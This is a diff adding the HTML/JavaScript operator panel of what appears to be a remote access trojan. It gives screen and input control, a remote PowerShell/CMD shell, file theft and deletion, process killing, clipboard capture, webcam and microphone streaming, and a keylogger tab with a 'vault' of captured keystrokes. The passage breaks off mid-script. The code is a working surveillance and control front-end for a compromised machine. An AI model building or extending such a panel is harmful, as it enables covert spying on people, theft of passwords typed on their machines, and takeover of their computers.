@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Control Room</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0f; --surface: rgba(255,255,255,0.03); --surface2: rgba(255,255,255,0.06);
+            --border: rgba(255,255,255,0.08); --text: #e4e4e7; --text-dim: #71717a;
+            --accent: #00ff88; --accent2: #00aaff; --danger: #ff3366; --warn: #ffaa00;
+            --glass: rgba(15,15,25,0.85); --sidebar-w: 64px; --topbar-h: 48px;
+            --radius: 12px; --transition: 0.25s cubic-bezier(0.4,0,0.2,1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); overflow:hidden; height:100vh; }
+        ::-webkit-scrollbar { width:6px; } ::-webkit-scrollbar-track { background:transparent; }
+        ::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.15); border-radius:3px; }
+
+        /* SIDEBAR */
+        .sidebar { position:fixed; left:0; top:0; bottom:0; width:var(--sidebar-w); background:var(--glass);
+            backdrop-filter:blur(20px); border-right:1px solid var(--border); display:flex; flex-direction:column;
+            align-items:center; padding:12px 0; z-index:100; gap:4px; }
+        .sidebar .logo { font-size:24px; margin-bottom:12px; cursor:default; }
+        .nav-btn { width:44px; height:44px; border:none; background:transparent; color:var(--text-dim);
+            border-radius:12px; cursor:pointer; font-size:18px; display:flex; align-items:center;
+            justify-content:center; transition:var(--transition); position:relative; }
+        .nav-btn:hover { background:var(--surface2); color:var(--text); }
+        .nav-btn.active { background:rgba(0,255,136,0.12); color:var(--accent); }
+        .nav-btn.active::before { content:''; position:absolute; left:-2px; top:50%; transform:translateY(-50%);
+            width:4px; height:20px; background:var(--accent); border-radius:2px; }
+        .nav-btn .tooltip { position:absolute; left:56px; background:#1a1a2e; color:#fff; padding:6px 12px;
+            border-radius:8px; font-size:12px; white-space:nowrap; opacity:0; pointer-events:none;
+            transition:0.15s; font-family:'Inter'; }
+        .nav-btn:hover .tooltip { opacity:1; }
+        .sidebar-bottom { margin-top:auto; display:flex; flex-direction:column; gap:4px; }
+
+        /* TOPBAR */
+        .topbar { position:fixed; top:0; left:var(--sidebar-w); right:0; height:var(--topbar-h);
+            background:var(--glass); backdrop-filter:blur(20px); border-bottom:1px solid var(--border);
+            display:flex; align-items:center; padding:0 20px; z-index:90; justify-content:space-between; }
+        .topbar-left { display:flex; align-items:center; gap:16px; }
+        .topbar-right { display:flex; align-items:center; gap:12px; }
+        .status-badge { padding:4px 12px; border-radius:20px; font-size:11px; font-weight:600;
+            text-transform:uppercase; letter-spacing:0.5px; }
+        .status-badge.online { background:rgba(0,255,136,0.15); color:var(--accent); border:1px solid rgba(0,255,136,0.3); }
+        .stats-pill { background:var(--surface); border:1px solid var(--border); padding:4px 12px;
+            border-radius:20px; font-size:12px; font-family:'JetBrains Mono'; color:var(--text-dim); }
+
+        /* MAIN CONTENT */
+        .main { position:fixed; top:var(--topbar-h); left:var(--sidebar-w); right:0; bottom:0; overflow:hidden; }
+        .tab-content { display:none; width:100%; height:100%; overflow-y:auto; }
+        .tab-content.active { display:flex; flex-direction:column; }
+
+        /* SCREEN TAB */
+        #tab-screen { position:relative; overflow:hidden; }
+        #screen-canvas { width:100%; height:100%; object-fit:contain; background:#000; cursor:none; }
+        #webcam-pip { position:absolute; bottom:20px; right:20px; width:220px; border-radius:12px;
+            border:2px solid var(--border); display:none; box-shadow:0 8px 32px rgba(0,0,0,0.5); }
+        .screen-toolbar { position:absolute; bottom:20px; left:50%; transform:translateX(-50%);
+            display:flex; gap:8px; background:var(--glass); backdrop-filter:blur(20px);
+            border:1px solid var(--border); border-radius:16px; padding:8px 16px; }
+
+        /* BUTTONS */
+        .btn { padding:8px 16px; background:var(--surface); border:1px solid var(--border); color:var(--text);
+            border-radius:10px; cursor:pointer; font-size:13px; font-family:'Inter'; transition:var(--transition);
+            display:flex; align-items:center; gap:6px; white-space:nowrap; }
+        .btn:hover { background:var(--surface2); border-color:rgba(255,255,255,0.15); transform:translateY(-1px); }
+        .btn.active { background:rgba(0,255,136,0.15); border-color:var(--accent); color:var(--accent); }
+        .btn.danger { background:rgba(255,51,102,0.15); border-color:var(--danger); color:var(--danger); }
+        .btn.danger:hover { background:rgba(255,51,102,0.25); }
+        .btn-sm { padding:5px 10px; font-size:12px; border-radius:8px; }
+        .btn-icon { width:36px; height:36px; padding:0; justify-content:center; border-radius:10px; }
+
+        /* TERMINAL TAB */
+        .terminal-container { flex:1; display:flex; flex-direction:column; background:#0d0d0d; }
+        .terminal-header { display:flex; align-items:center; gap:12px; padding:12px 16px;
+            background:var(--surface); border-bottom:1px solid var(--border); }
+        .terminal-output { flex:1; padding:16px; font-family:'JetBrains Mono',monospace; font-size:13px;
+            line-height:1.6; overflow-y:auto; white-space:pre-wrap; word-break:break-all; color:#a3e635; }
+        .terminal-input-row { display:flex; align-items:center; padding:8px 16px; background:rgba(0,0,0,0.4);
+            border-top:1px solid var(--border); }
+        .terminal-input { flex:1; background:transparent; border:none; color:#a3e635; font-family:'JetBrains Mono';
+            font-size:13px; outline:none; padding:8px; }
+        .terminal-prompt { color:var(--accent); font-family:'JetBrains Mono'; font-size:13px; margin-right:8px; }
+
+        /* FILES TAB */
+        .files-container { flex:1; display:flex; flex-direction:column; }
+        .files-toolbar { display:flex; align-items:center; gap:12px; padding:12px 16px;
+            background:var(--surface); border-bottom:1px solid var(--border); }
+        .path-bar { flex:1; background:var(--bg); border:1px solid var(--border); border-radius:8px;
+            padding:8px 12px; color:var(--text); font-family:'JetBrains Mono'; font-size:13px; outline:none; }
+        .file-list { flex:1; overflow-y:auto; padding:8px; }
+        .file-row { display:flex; align-items:center; padding:10px 16px; border-radius:8px; cursor:pointer;
+            transition:var(--transition); gap:12px; }
+        .file-row:hover { background:var(--surface2); }
+        .file-icon { font-size:20px; width:32px; text-align:center; }
+        .file-name { flex:1; font-size:13px; font-weight:500; }
+        .file-meta { font-size:12px; color:var(--text-dim); min-width:100px; text-align:right; }
+
+        /* VITALS TAB */
+        .vitals-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; padding:20px; overflow-y:auto; flex:1; }
+        .vitals-card { background:var(--surface); border:1px solid var(--border); border-radius:var(--radius);
+            padding:20px; }
+        .vitals-card h3 { font-size:13px; color:var(--text-dim); margin-bottom:4px; text-transform:uppercase;
+            letter-spacing:1px; font-weight:600; }
+        .vitals-value { font-size:36px; font-weight:700; margin-bottom:12px;
+            background:linear-gradient(135deg,var(--accent),var(--accent2));
+            -webkit-background-clip:text;
+            background-clip:text;
+            -webkit-text-fill-color:transparent; }
+        .vitals-chart { height:120px; }
+
+        /* PROCESS TAB */
+        .process-container { flex:1; display:flex; flex-direction:column; }
+        .process-header { display:flex; align-items:center; gap:12px; padding:12px 16px;
+            background:var(--surface); border-bottom:1px solid var(--border); }
+        .process-search { background:var(--bg); border:1px solid var(--border); border-radius:8px;
+            padding:8px 12px; color:var(--text); font-size:13px; outline:none; flex:1; max-width:300px; }
+        .process-table { flex:1; overflow-y:auto; }
+        .process-table table { width:100%; border-collapse:collapse; }
+        .process-table th { position:sticky; top:0; background:var(--bg); padding:10px 16px; text-align:left;
+            font-size:12px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.5px;
+            border-bottom:1px solid var(--border); cursor:pointer; }
+        .process-table td { padding:8px 16px; font-size:13px; border-bottom:1px solid var(--border); }
+        .process-table tr:hover { background:var(--surface); }
+
+        /* AUDIO TAB */
+        .audio-container { flex:1; display:flex; flex-direction:column; align-items:center;
+            justify-content:center; gap:32px; }
+        .audio-visualizer { width:80%; max-width:800px; height:200px; background:var(--surface);
+            border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; }
+        .audio-controls { display:flex; gap:16px; align-items:center; }
+        .audio-big-btn { width:72px; height:72px; border-radius:50%; border:2px solid var(--accent);
+            background:rgba(0,255,136,0.1); color:var(--accent); font-size:28px; cursor:pointer;
+            transition:var(--transition); display:flex; align-items:center; justify-content:center; }
+        .audio-big-btn:hover { background:rgba(0,255,136,0.2); transform:scale(1.1); }
+        .audio-big-btn.recording { border-color:var(--danger); background:rgba(255,51,102,0.15);
+            color:var(--danger); animation:pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
+
+        /* KEYLOGGER TAB */
+        .keylog-container { flex:1; display:flex; flex-direction:column; }
+        .keylog-header { display:flex; align-items:center; gap:12px; padding:12px 16px;
+            background:var(--surface); border-bottom:1px solid var(--border); }
+        .keylog-output { flex:1; padding:16px; font-family:'JetBrains Mono'; font-size:13px;
+            line-height:2; overflow-y:auto; }
+        .key-badge { display:inline-block; background:var(--surface2); border:1px solid var(--border);
+            padding:2px 8px; border-radius:6px; margin:2px; font-size:12px; }
+        .key-badge.special { border-color:var(--accent); color:var(--accent); }
+
+        /* CHAT TAB */
+        .chat-container { flex:1; display:flex; flex-direction:column; max-width:700px;
+            margin:0 auto; width:100%; }
+        .chat-messages { flex:1; overflow-y:auto; padding:20px; display:flex; flex-direction:column; gap:12px; }
+        .chat-bubble { max-width:70%; padding:12px 16px; border-radius:16px; font-size:14px; line-height:1.5; }
+        .chat-bubble.sent { align-self:flex-end; background:linear-gradient(135deg,#0066ff,#0044cc);
+            border-bottom-right-radius:4px; }
+        .chat-bubble.received { align-self:flex-start; background:var(--surface2);
+            border-bottom-left-radius:4px; }
+        .chat-time { font-size:11px; color:var(--text-dim); margin-top:4px; }
+        .chat-input-row { display:flex; gap:12px; padding:16px; border-top:1px solid var(--border); }
+        .chat-input { flex:1; background:var(--surface); border:1px solid var(--border); border-radius:12px;
+            padding:12px 16px; color:var(--text); font-size:14px; outline:none; font-family:'Inter'; }
+        .chat-input:focus { border-color:var(--accent); }
+        .chat-send { width:48px; height:48px; border-radius:12px; border:none; background:var(--accent);
+            color:#000; font-size:20px; cursor:pointer; transition:var(--transition); }
+        .chat-send:hover { transform:scale(1.05); }
+
+        /* ALERTS SECTION IN CHAT */
+        .alert-panel { padding:16px; border-top:1px solid var(--border); background:var(--surface); }
+        .alert-panel h4 { font-size:13px; color:var(--text-dim); margin-bottom:12px; }
+        .alert-row { display:flex; gap:8px; margin-bottom:8px; }
+        .alert-input { flex:1; background:var(--bg); border:1px solid var(--border); border-radius:8px;
+            padding:8px 12px; color:var(--text); font-size:13px; outline:none; }
+        select.alert-input { cursor:pointer; }
+
+        /* Responsive */
+        @media(max-width:900px) { .vitals-grid { grid-template-columns:1fr; } }
+    </style>
+</head>
+<body>
+    <!-- SIDEBAR -->
+    <nav class="sidebar">
+        <div class="logo">⚡</div>
+        <button class="nav-btn active" onclick="switchTab('screen')" id="nav-screen">🖥️<span class="tooltip">Screen</span></button>
+        <button class="nav-btn" onclick="switchTab('terminal')" id="nav-terminal">💻<span class="tooltip">Terminal</span></button>
+        <button class="nav-btn" onclick="switchTab('files')" id="nav-files">📂<span class="tooltip">Files</span></button>
+        <button class="nav-btn" onclick="switchTab('vitals')" id="nav-vitals">📊<span class="tooltip">Vitals</span></button>
+        <button class="nav-btn" onclick="switchTab('processes')" id="nav-processes">🔧<span class="tooltip">Processes</span></button>
+        <button class="nav-btn" onclick="switchTab('audio')" id="nav-audio">🎙️<span class="tooltip">Audio</span></button>
+        <button class="nav-btn" onclick="switchTab('keylogger')" id="nav-keylogger">⌨️<span class="tooltip">Keylogger</span></button>
+        <button class="nav-btn" onclick="switchTab('chat')" id="nav-chat">💬<span class="tooltip">Chat</span></button>
+    </nav>
+
+    <!-- TOPBAR -->
+    <div class="topbar">
+        <div class="topbar-left">
+            <span class="status-badge online" id="statusBadge">● LIVE</span>
+            <span class="stats-pill" id="fpsPill">FPS: -- | Ping: --ms</span>
+        </div>
+        <div class="topbar-right">
+            <span class="stats-pill" id="resPill">--</span>
+            <span class="stats-pill" id="monitorPill">Mon: 1</span>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <div class="main">
+        <!-- SCREEN TAB -->
+        <div class="tab-content active" id="tab-screen">
+            <canvas id="screen-canvas"></canvas>
+            <img id="webcam-pip" src="">
+            <div class="screen-toolbar">
+                <button class="btn btn-sm" onclick="toggleMouseLock()" id="mouseBtn">🖱️ Lock Mouse</button>
+                <button class="btn btn-sm" onclick="sendHotkey('ctrl','alt','delete')">⌨️ CtrlAltDel</button>
+                <button class="btn btn-sm" onclick="sendHotkey('win','r')">🏠 Win+R</button>
+                <button class="btn btn-sm" onclick="syncClipboard()">📋 Clipboard</button>
+                <button class="btn btn-sm" onclick="toggleWebcam()">📹 Cam</button>
+                <button class="btn btn-sm" onclick="toggleRecording()" id="recordBtn">🔴 Record</button>
+                <button class="btn btn-sm" onclick="switchMonitor()" id="monBtn">🖥️ Monitor</button>
+            </div>
+        </div>
+
+        <!-- TERMINAL TAB -->
+        <div class="tab-content" id="tab-terminal">
+            <div class="terminal-container">
+                <div class="terminal-header">
+                    <button class="btn btn-sm active" id="shellPsBtn" onclick="startTerminal('powershell')">PowerShell</button>
+                    <button class="btn btn-sm" id="shellCmdBtn" onclick="startTerminal('cmd')">CMD</button>
+                    <div style="flex:1"></div>
+                    <button class="btn btn-sm danger" onclick="clearTerminal()">Clear</button>
+                </div>
+                <div class="terminal-output" id="termOutput"></div>
+                <div class="terminal-input-row">
+                    <span class="terminal-prompt">❯</span>
+                    <input class="terminal-input" id="termInput" placeholder="Type command..." autocomplete="off" spellcheck="false">
+                </div>
+            </div>
+        </div>
+
+        <!-- FILES TAB -->
+        <div class="tab-content" id="tab-files">
+            <div class="files-container">
+                <div class="files-toolbar">
+                    <button class="btn btn-sm" onclick="browseParent()">⬆️</button>
+                    <input class="path-bar" id="pathBar" value="~" onkeydown="if(event.key==='Enter')browsePath(this.value)">
+                    <button class="btn btn-sm" onclick="browsePath(document.getElementById('pathBar').value)">Go</button>
+                    <label class="btn btn-sm" style="cursor:pointer">📤 Upload<input type="file" hidden onchange="uploadFile(this)"></label>
+                </div>
+                <div class="file-list" id="fileList"></div>
+            </div>
+        </div>
+
+        <!-- VITALS TAB -->
+        <div class="tab-content" id="tab-vitals">
+            <div class="vitals-grid">
+                <div class="vitals-card"><h3>🔥 CPU Usage</h3><div class="vitals-value" id="cpuVal">0%</div><div class="vitals-chart"><canvas id="cpuChart"></canvas></div></div>
+                <div class="vitals-card"><h3>🧠 RAM Usage</h3><div class="vitals-value" id="ramVal">0%</div><div class="vitals-chart"><canvas id="ramChart"></canvas></div></div>
+                <div class="vitals-card"><h3>💾 Disk Usage</h3><div class="vitals-value" id="diskVal">0%</div><div class="vitals-chart"><canvas id="diskChart"></canvas></div></div>
+                <div class="vitals-card"><h3>🌐 Network I/O</h3><div class="vitals-value" id="netVal">0 MB</div><div class="vitals-chart"><canvas id="netChart"></canvas></div></div>
+                <div class="vitals-card" id="gpuCard" style="display:none"><h3>🎮 GPU</h3><div class="vitals-value" id="gpuVal">0%</div><div class="vitals-chart"><canvas id="gpuChart"></canvas></div></div>
+                <div class="vitals-card"><h3>📊 CPU Cores</h3><div id="coresList" style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;"></div></div>
+            </div>
+        </div>
+
+        <!-- PROCESSES TAB -->
+        <div class="tab-content" id="tab-processes">
+            <div class="process-container">
+                <div class="process-header">
+                    <input class="process-search" id="procSearch" placeholder="🔍 Search processes..." oninput="filterProcesses()">
+                    <button class="btn btn-sm" onclick="refreshProcesses()">🔄 Refresh</button>
+                </div>
+                <div class="process-table"><table><thead><tr>
+                    <th onclick="sortProcs('pid')">PID</th><th onclick="sortProcs('name')">Name</th>
+                    <th onclick="sortProcs('cpu')">CPU %</th><th onclick="sortProcs('ram')">RAM (MB)</th>
+                    <th onclick="sortProcs('status')">Status</th><th>Action</th>
+                </tr></thead><tbody id="procBody"></tbody></table></div>
+            </div>
+        </div>
+
+        <!-- AUDIO TAB -->
+        <div class="tab-content" id="tab-audio">
+            <div class="audio-container">
+                <h2 style="font-weight:300;color:var(--text-dim)">🎙️ Audio Streaming</h2>
+                <canvas id="audioVisualizer" class="audio-visualizer"></canvas>
+                <div class="audio-controls">
+                    <button class="btn" onclick="startAudio('mic')" id="micBtn">🎤 Microphone</button>
+                    <button class="audio-big-btn" onclick="toggleAudio()" id="audioPlayBtn">▶</button>
+                    <button class="btn" onclick="startAudio('system')" id="sysBtn">🔊 System Audio</button>
+                </div>
+                <div style="display:flex;align-items:center;gap:12px">
+                    <span style="font-size:13px;color:var(--text-dim)">Volume</span>
+                    <input type="range" min="0" max="100" value="80" id="volumeSlider" oninput="setVolume(this.value)" style="width:200px">
+                </div>
+            </div>
+        </div>
+
+        <!-- KEYLOGGER TAB -->
+        <div class="tab-content" id="tab-keylogger">
+            <div class="keylog-container">
+                <div class="keylog-header">
+                    <input class="process-search" id="keylogSearch" placeholder="🔍 Search keystrokes..." style="max-width:300px">
+                    <button class="btn btn-sm" onclick="fetchKeylog()">🔄 Refresh</button>
+                    <div style="flex:1"></div>
+                    <span class="stats-pill" id="keylogCount">0 keys</span>
+                    <button class="btn btn-sm danger" onclick="clearKeylog()">🗑️ Clear Vault</button>
+                </div>
+                <div class="keylog-output" id="keylogOutput"></div>
+            </div>
+        </div>
+
+        <!-- CHAT TAB -->
+        <div class="tab-content" id="tab-chat">
+            <div class="chat-container">
+                <div class="chat-messages" id="chatMessages"></div>
+                <div class="chat-input-row">
+                    <input class="chat-input" id="chatInput" placeholder="Send a message to the host..." onkeydown="if(event.key==='Enter')sendChat()">
+                    <button class="chat-send" onclick="sendChat()">➤</button>
+                </div>
+                <div class="alert-panel">
+                    <h4>📢 System Alerts</h4>
+                    <div class="alert-row">
+                        <input class="alert-input" id="alertTitle" placeholder="Title" value="System Alert">
+                        <select class="alert-input" id="alertIcon" style="max-width:120px">
+                            <option value="info">ℹ️ Info</option><option value="warning">⚠️ Warning</option><option value="error">❌ Error</option>
+                        </select>
+                    </div>
+                    <div class="alert-row">
+                        <input class="alert-input" id="alertMsg" placeholder="Alert message..." onkeydown="if(event.key==='Enter')sendAlert()">
+                        <button class="btn btn-sm" onclick="sendAlert()">📢 Send Alert</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+// ============================================================
+//  SOCKET & GLOBALS
+// ============================================================
+const socket = io({ transports: ['websocket'] });
+const canvas = document.getElementById('screen-canvas');
+const ctx = canvas.getContext('2d');
+let mouseLocked=false, screenSize={width:1920,height:1080}, mouseX=0, mouseY=0;
+let frameCount=0, lastFrame=0, fps=0, currentMonitor=1, totalMonitors=1;
+let processData=[], procSortKey='cpu', procSortAsc=false;
+
+// ============================================================
+//  TAB SWITCHING
+// ============================================================
+function switchTab(tab) {
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById('tab-'+tab).classList.add('active');
+    document.getElementById('nav-'+tab).classList.add('active');
+    if(tab==='vitals') socket.emit('vitals_start');
+    else socket.emit('vitals_stop');
+    if(tab==='processes') refreshProcesses();
+    if(tab==='keylogger') fetchKeylog();
+    if(tab==='files' && !document.getElementById('fileList').innerHTML) socket.emit('file_browse',{});
+    if(tab==='chat') socket.emit('chat_history');
+}
+
+// ============================================================
+//  SCREEN TAB
+// ============================================================
+function resizeCanvas() {
+    canvas.width = canvas.clientWidth * devicePixelRatio;
+    canvas.height = canvas.clientHeight * devicePixelRatio;
+    ctx.scale(devicePixelRatio, devicePixelRatio);
+}
+window.addEventListener('resize', resizeCanvas); resizeCanvas();
+
+socket.on('init', d => {
+    screenSize = d.screen_size; totalMonitors = d.monitors;
+    document.getElementById('statusBadge').textContent = '● LIVE';
+    document.getElementById('resPill').textContent = screenSize.width+'×'+screenSize.height;
+    if(d.gpu_available) document.getElementById('gpuCard').style.display='';
+});
+
+socket.on('screen_frame', d => {
+    const img = new Image();
+    img.onload = () => {
+        ctx.drawImage(img, 0, 0, canvas.clientWidth, canvas.clientHeight);
+        frameCount++;
+        const now = performance.now();
+        if(now - lastFrame > 1000) {
+            fps = Math.round(frameCount*1000/(now-lastFrame));
+            document.getElementById('fpsPill').textContent = `FPS: ${fps} | Ping: ${Math.round(Date.now()/1000 - d.timestamp)}ms`;
+            frameCount=0; lastFrame=now;
+        }
+    };
+    img.src = 'data:image/jpeg;base64,'+d.image;
+});
+
+socket.on('webcam_frame', d => { document.getElementById('webcam-pip').src = 'data:image/jpeg;base64,'+d.image; });
+
+// Mouse
+function toggleMouseLock() { mouseLocked ? document.exitPointerLock() : canvas.requestPointerLock(); }
+document.addEventListener('pointerlockchange', () => {
+    mouseLocked = document.pointerLockElement === canvas;
+    document.getElementById('mouseBtn').classList.toggle('active', mouseLocked);
+});
+canvas.addEventListener('mousemove', e => {
+    if(!mouseLocked) return;
+    const sx=screenSize.width/canvas.clientWidth, sy=screenSize.height/canvas.clientHeight;
+    mouseX=Math.max(0,Math.min(screenSize.width,mouseX+e.movementX*sx));
+    mouseY=Math.max(0,Math.min(screenSize.height,mouseY+e.movementY*sy));
+    socket.emit('mouse',{type:'move',x:Math.round(mouseX),y:Math.round(mouseY)});
+});
+canvas.addEventListener('mousedown', e => { if(!mouseLocked) return; e.preventDefault();
+    socket.emit('mouse',{type:'click',button:e.button===2?'right':'left'}); });
+canvas.addEventListener('contextmenu', e => e.preventDefault());
+canvas.addEventListener('wheel', e => { if(!mouseLocked) return;
+    socket.emit('mouse',{type:'scroll',amount:e.deltaY>0?-3:3}); });
+document.addEventListener('keydown', e => { if(!mouseLocked) return; e.preventDefault();
+    socket.emit('keyboard',{type:'press',key:e.key.length===1?e.key:e.key.toLowerCase()}); });
+
+function sendHotkey(...keys) { socket.emit('keyboard',{type:'hotkey',keys}); }
+function toggleWebcam() { const w=document.getElementById('webcam-pip'); w.style.display=w.style.display==='none'?'block':'none'; }
+
+// Session Recording
+let mediaRecorder=null, recordedChunks=[];
+function toggleRecording() {
+    const btn=document.getElementById('recordBtn');
+    if(!mediaRecorder || mediaRecorder.state==='inactive') {
+        const stream = canvas.captureStream(30);
+        mediaRecorder = new MediaRecorder(stream, {mimeType:'video/webm;codecs=vp9'});
+        recordedChunks=[];
+        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks,{type:'video/webm'});
+            const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
+            a.download='recording_'+Date.now()+'.webm'; a.click();
+        };
+        mediaRecorder.start(); btn.classList.add('active'); btn.textContent='⏹️ Stop';
+    } else {
+        mediaRecorder.stop(); btn.classList.remove('active'); btn.textContent='🔴 Record';
+    }
+}
+
+// Multi-Monitor
+function switchMonitor() {
+    currentMonitor = currentMonitor >= totalMonitors ? 1 : currentMonitor+1;
+    socket.emit('monitor_switch',{index:currentMonitor});
+    document.getElementById('monitorPill').textContent='Mon: '+currentMonitor;
+}
+
+// Clipboard
+function syncClipboard() {
+    socket.emit('clipboard_get');
+    socket.once('clipboard_content', d => {
+        if(d.content) { navigator.clipboard.writeText(d.content); alert('📋 Clipboard synced:\n'+d.content.substring(0,200)); }
+    });
+}
+
+// ============================================================
+//  TERMINAL TAB
+// ============================================================
+let termStarted = false;
+function startTerminal(shell) {
+    document.getElementById('termOutput').innerHTML='';
+    socket.emit('terminal_start',{shell});
+    termStarted=true;
+    document.getElementById('shellPsBtn').classList.toggle('active',shell==='powershell');
+    document.getElementById('shellCmdBtn').classList.toggle('active',shell==='cmd');
+}
+socket.on('terminal_output', d => {
+    const el=document.getElementById('termOutput');
+    el.textContent += d.output; el.scrollTop=el.scrollHeight;
+});
+document.getElementById('termInput').addEventListener('keydown', e => {
+    if(e.key==='Enter') {
+        if(!termStarted) startTerminal('powershell');
+        socket.emit('terminal_input',{input:e.target.value}); e.target.value='';
+    }
+});
+function clearTerminal() { document.getElementById('termOutput').innerHTML=''; }
+
+// ============================================================
+//  FILES TAB
+// ============================================================
+let currentPath = '';
+socket.on('file_list', d => {
+    if(d.error) { alert(d.error); return; }
+    currentPath = d.path;
+    document.getElementById('pathBar').value = d.path;
+    const list = document.getElementById('fileList');
+    list.innerHTML = d.entries.map(f => `
+        <div class="file-row" ondblclick="${f.is_dir ? `browsePath('${f.path.replace(/'/g,"\\'")}')` : `downloadFile('${f.path.replace(/'/g,"\\'")}')` }">
+            <span class="file-icon">${f.is_dir?'📁':'📄'}</span>
+            <span class="file-name">${f.name}${f.error?' 🔒':''}</span>
+            <span class="file-meta">${f.is_dir?'':formatSize(f.size)}</span>
+            <span class="file-meta">${f.modified}</span>
+            ${!f.is_dir?`<button class="btn btn-sm" onclick="event.stopPropagation();downloadFile('${f.path.replace(/'/g,"\\'")}')">⬇️</button>`:''}
+            <button class="btn btn-sm danger" onclick="event.stopPropagation();deleteFile('${f.path.replace(/'/g,"\\'")}','${f.name}')">🗑️</button>
+        </div>`).join('');
+});
+function browsePath(p) { socket.emit('file_browse',{path:p}); }
+function browseParent() { const p=document.getElementById('pathBar').value; const parent=p.substring(0,p.lastIndexOf('/')); browsePath(parent||'/'); }
+function downloadFile(p) { window.open('/download?path='+encodeURIComponent(p),'_blank'); }
+function deleteFile(p,n) { if(confirm('Delete '+n+'?')) socket.emit('file_delete',{path:p}); }
+socket.on('file_delete_status', d => { if(d.success) browsePath(currentPath); else alert('Error: '+d.error); });
+function uploadFile(input) {
+    const file=input.files[0]; if(!file) return;
+    const reader=new FileReader();
+    reader.onload = () => {
+        socket.emit('file_upload',{path:currentPath+'/'+file.name, content:reader.result.split(',')[1]});
+    }; reader.readAsDataURL(file);
+}
+socket.on('file_upload_status', d => { if(d.success) browsePath(currentPath); else alert('Upload error: '+d.error); });
+function formatSize(b) { if(b<1024) return b+'B'; if(b<1048576) return (b/1024).toFixed(1)+'KB'; return (b/1048576).toFixed(1)+'MB'; }
+
+// ============================================================
+//  VITALS TAB
+// ============================================================
+const chartOpts = {responsive:true,maintainAspectRatio:false,animation:{duration:300},scales:{x:{display:false},y:{min:0,max:100,ticks:{color:'#555'}}},plugins:{legend:{display:false}},elements:{point:{radius:0},line:{tension:0.4,borderWidth:2}}};
+const cpuData=[],ramData=[],diskData=[],netSent=[],netRecv=[],gpuData=[];
+const labels=Array(30).fill('');
+function makeChart(id,color,data) {
+    return new Chart(document.getElementById(id),{type:'line',data:{labels,datasets:[{data,borderColor:color,backgroundColor:color+'22',fill:true}]},options:{...chartOpts}});
+}
+const cpuChart=makeChart('cpuChart','#00ff88',cpuData);
+const ramChart=makeChart('ramChart','#00aaff',ramData);
+const diskChart=makeChart('diskChart','#ffaa00',diskData);
+const netChart=new Chart(document.getElementById('netChart'),{type:'line',data:{labels,datasets:[{label:'Sent',data:netSent,borderColor:'#ff3366',backgroundColor:'#ff336622',fill:true},{label:'Recv',data:netRecv,borderColor:'#00aaff',backgroundColor:'#00aaff22',fill:true}]},options:{...chartOpts,scales:{x:{display:false},y:{min:0,ticks:{color:'#555'}}},plugins:{legend:{display:true,labels:{color:'#888',font:{size:10}}}}}});
+let gpuChart=null;
+
+socket.on('vitals_update', d => {
+    function push(arr,v) { arr.push(v); if(arr.length>30) arr.shift(); }
+    push(cpuData,d.cpu); push(ramData,d.ram_percent); push(diskData,d.disk_percent);
+    push(netSent,d.net_sent); push(netRecv,d.net_recv);
+    document.getElementById('cpuVal').textContent=d.cpu+'%';
+    document.getElementById('ramVal').textContent=d.ram_percent+'% ('+d.ram_used+'/'+d.ram_total+' GB)';
+    document.getElementById('diskVal').textContent=d.disk_percent+'% ('+d.disk_used+'/'+d.disk_total+' GB)';
+    document.getElementById('netVal').textContent='↑'+d.net_sent+'MB ↓'+d.net_recv+'MB';
+    cpuChart.update(); ramChart.update(); diskChart.update(); netChart.update();
+    if(d.gpu_load!==undefined) {
+        push(gpuData,d.gpu_load);
+        document.getElementById('gpuVal').textContent=d.gpu_load+'% | '+d.gpu_temp+'°C';
+        if(!gpuChart) gpuChart=makeChart('gpuChart','#a855f7',gpuData);
+        else gpuChart.update();
+    }
+    // CPU Cores
+    const cl=document.getElementById('coresList');
+    cl.innerHTML=(d.cpu_cores||[]).map((v,i)=>`<div style="background:hsl(${120-v*1.2},80%,40%);padding:4px 10px;border-radius:8px;font-size:11px;font-weight:600;">C${i}: ${v}%</div>`).join('');
+});
+
+// ============================================================
+//  PROCESSES TAB
+// ============================================================
+function refreshProcesses() { socket.emit('process_list'); }
+socket.on('process_data', d => { processData=d.processes; renderProcesses(); });
+function renderProcesses() {
+    const q=document.getElementById('procSearch').value.toLowerCase();
+    const filtered=processData.filter(p=>p.name.toLowerCase().includes(q)||String(p.pid).includes(q));
+    filtered.sort((a,b)=>procSortAsc?(a[procSortKey]>b[procSortKey]?1:-1):(a[procSortKey]<b[procSortKey]?1:-1));
+    document.getElementById('procBody').innerHTML=filtered.slice(0,150).map(p=>`<tr>
+        <td>${p.pid}</td><td>${p.name}</td>
+        <td style="color:${p.cpu>50?'var(--danger)':p.cpu>20?'var(--warn)':'var(--text)'}">${p.cpu}%</td>
+        <td>${p.ram} MB</td><td>${p.status}</td>
+        <td><button class="btn btn-sm danger" onclick="killProcess(${p.pid},'${p.name}')">Kill</button></td>
+    </tr>`).join('');
+}
+function filterProcesses() { renderProcesses(); }
